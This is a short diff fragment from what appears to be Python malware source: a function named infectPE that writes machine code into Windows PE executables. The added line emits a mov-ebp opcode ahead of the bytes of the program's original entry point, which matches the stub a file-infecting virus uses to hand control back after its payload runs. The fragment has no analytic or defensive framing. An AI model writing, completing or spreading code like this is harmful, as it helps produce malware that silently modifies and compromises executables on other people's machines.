@@ -66,6 +66,7 @@ def infectPE(filename, code):
 		codeBytes += b'\x31\xd2'
 		codeBytes += b'\x31\xf6'
 
+	codeBytes.append(0xbd)
 	codeBytes.append(struct.pack('I',trueEP+pe.OPTIONAL_HEADER.ImageBase)[0])
 	codeBytes.append(struct.pack('I',trueEP+pe.OPTIONAL_HEADER.ImageBase)[1])
 	codeBytes.append(struct.pack('I',trueEP+pe.OPTIONAL_HEADER.ImageBase)[2])
